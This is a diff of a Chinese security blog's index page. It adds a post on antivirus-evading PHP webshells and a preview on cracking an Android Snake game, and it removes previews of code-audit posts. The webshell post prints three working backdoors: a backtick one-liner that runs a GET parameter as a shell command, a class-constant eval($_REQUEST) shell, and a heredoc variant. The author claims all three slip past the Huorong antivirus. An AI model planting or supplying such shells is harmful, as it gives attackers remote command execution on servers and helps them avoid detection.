@@ -144,6 +144,172 @@
           <div id="js-content" class="content-ll">
             
   
+    <article id="post-免杀Webshell" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/10/14/%E5%85%8D%E6%9D%80Webshell/">PHP下的几种免杀Webshell</a>
+    </h1>
+  
+
+        
+        <a href="/2022/10/14/%E5%85%8D%E6%9D%80Webshell/" class="archive-article-date">
+  	<time datetime="2022-10-14T07:26:57.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-14</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="重音符下的PHP"><a href="#重音符下的PHP" class="headerlink" title="重音符下的PHP"></a>重音符下的PHP</h1><p>在PHP中，当你写一个集合等于一个用重音符包裹的字符串的变量时，它将像在<code>shell_exec()</code>命令内一样被执行。</p>
+<p><a target="_blank" rel="noopener" href="https://www.nuomiphp.com/eplan/437635.html%E3%80%82%E5%85%B7%E4%BD%93%E7%9A%84%E5%8E%9F%E5%9B%A0%E6%88%91%E4%BB%AC%E4%B9%9F%E4%B8%8D%E6%B7%B1%E7%A9%B6%EF%BC%8C%E5%8F%AA%E9%9C%80%E8%A6%81%E7%9F%A5%E9%81%93%E5%AE%83%E7%9A%84%E5%8A%9F%E8%83%BD%E5%B0%B1%E6%98%AF%E5%8F%AF%E4%BB%A5%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4%EF%BC%8C%E5%90%8C%E6%97%B6%E5%AE%83%E7%9A%84%E6%9C%A8%E9%A9%AC%E4%B9%9F%E5%BE%88%E7%AE%80%E5%8D%95%EF%BC%8C%E5%8F%AA%E9%9C%80%E8%A6%81%E8%BD%BB%E8%BD%BB%E6%9D%BE%E6%9D%BE%E7%9A%84%E4%B8%80%E5%8F%A5%E8%AF%9D%E3%80%82">https://www.nuomiphp.com/eplan/437635.html。具体的原因我们也不深究，只需要知道它的功能就是可以执行命令，同时它的木马也很简单，只需要轻轻松松的一句话。</a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span>`<span class="variable">$_GET</span>[<span class="number">1</span>]`;</span><br></pre></td></tr></table></figure>
+
+<p>免杀效果也是杠杠的：</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014160329227.png" alt="image-20221014160329227"></p>
+<p>也能够执行。</p>
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014160341372.png" alt="image-20221014160341372"></p>
+<h1 id="使用类的Webshell"><a href="#使用类的Webshell" class="headerlink" title="使用类的Webshell"></a>使用类的Webshell</h1><p>使用类的webshell是老生长谈的话题了。同样这个也能过掉火绒并且正常使用。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line"><span class="keyword">const</span> name=<span class="string">&#x27;eval(end($_REQUEST));&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">eval</span>(test::name);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014161725215.png" alt="image-20221014161725215"></p>
+<h1 id="使用PHP版本差异的方法"><a href="#使用PHP版本差异的方法" class="headerlink" title="使用PHP版本差异的方法"></a>使用PHP版本差异的方法</h1><p>php 7.3.4的版本下，在<code>;</code>号下可以解析传过来的参数</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?=</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&lt;&lt;&lt; aa</span></span><br><span class="line"><span class="string">assasssasssasssasssasssasssasssasssasssasssassss</span></span><br><span class="line"><span class="string">aa</span>;<span class="keyword">echo</span> `<span class="variable">$_GET</span>[<span class="number">1</span>]`</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20221014161811974.png" alt="image-20221014161811974"></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">萌新免杀的故事</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/10/14/%E5%85%8D%E6%9D%80Webshell/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
+    <article id="post-安卓之贪吃蛇破解" class="article article-type-post  article-index" itemscope itemprop="blogPost">
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2022/10/08/%E5%AE%89%E5%8D%93%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87%E7%A0%B4%E8%A7%A3/">安卓之贪吃蛇破解</a>
+    </h1>
+  
+
+        
+        <a href="/2022/10/08/%E5%AE%89%E5%8D%93%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87%E7%A0%B4%E8%A7%A3/" class="archive-article-date">
+  	<time datetime="2022-10-08T03:20:06.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-10-08</time>
+</a>
+        
+      </header>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="smali结构"><a href="#smali结构" class="headerlink" title="smali结构"></a>smali结构</h1><p>我们之前说过，安卓的dex文件存放的是开发者写的方法(即java代码)。而一个apk包经过反编译后，一个dex文件就会变成一个smali文件，当dex内的方法超过65535个，就会出现2个dex文件夹，即反编译会出现2个smali文件。</p>
+<p>开发者开发时，一般会用com文件夹表示是作者自己写的代码。</p>
+        
+          <a class="article-more-a" href="/2022/10/08/%E5%AE%89%E5%8D%93%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87%E7%A0%B4%E8%A7%A3/#more">more >></a>
+        
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<i class="icon-price-tags icon"></i>
+		<ul class="article-tag-list">
+			 
+        		<li class="article-tag-list-item">
+        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color3">Android</a>
+        		</li>
+      		
+		</ul>
+	</div>
+
+      
+
+      
+        <p class="article-more-link">
+          <a class="article-more-a" href="/2022/10/08/%E5%AE%89%E5%8D%93%E4%B9%8B%E8%B4%AA%E5%90%83%E8%9B%87%E7%A0%B4%E8%A7%A3/">展开全文 >></a>
+        </p>
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+  </div>
+</article>
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
+        </div>
+        
+        
+    </div>
+</aside>
+
+
+
+
+  
     <article id="post-安卓四大件" class="article article-type-post  article-index" itemscope itemprop="blogPost">
   <div class="article-inner">
     
@@ -833,160 +999,6 @@
       
         <p class="article-more-link">
           <a class="article-more-a" href="/2022/08/10/OASYS%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-若依CMS审计" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/08/09/%E8%8B%A5%E4%BE%9DCMS%E5%AE%A1%E8%AE%A1/">若依CMS审计</a>
-    </h1>
-  
-
-        
-        <a href="/2022/08/09/%E8%8B%A5%E4%BE%9DCMS%E5%AE%A1%E8%AE%A1/" class="archive-article-date">
-  	<time datetime="2022-08-09T05:02:35.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-09</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="项目结构"><a href="#项目结构" class="headerlink" title="项目结构"></a>项目结构</h1><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220809132918783.png" alt="image-20220809132918783"></p>
-<p>通过上图可以看到该项目主要使用了分包分模块的架构及若依框架，其他的框架技术不难通过若依框架的通用技术分析出来。引入的开源组件通过pom.xml获取。</p>
-        
-          <a class="article-more-a" href="/2022/08/09/%E8%8B%A5%E4%BE%9DCMS%E5%AE%A1%E8%AE%A1/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">java代码审计</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/08/09/%E8%8B%A5%E4%BE%9DCMS%E5%AE%A1%E8%AE%A1/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-ERP代码审计" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2022/08/08/ERP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">ERP代码审计</a>
-    </h1>
-  
-
-        
-        <a href="/2022/08/08/ERP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="archive-article-date">
-  	<time datetime="2022-08-08T05:25:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2022-08-08</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="项目技术分析"><a href="#项目技术分析" class="headerlink" title="项目技术分析"></a>项目技术分析</h1><p><img src="https://blog-image-1307324394.cos.ap-chongqing.myqcloud.com/img/blog-img/image-20220808132938309.png" alt="image-20220808132938309"></p>
-<p>通过项目结构，能够看出来使用的技术为前后端分离。在看readme文档可以发现，技术框架分别有：</p>
-        
-          <a class="article-more-a" href="/2022/08/08/ERP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/#more">more >></a>
-        
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color4">java代码审计</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2022/08/08/ERP%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">展开全文 >></a>
         </p>
       
 
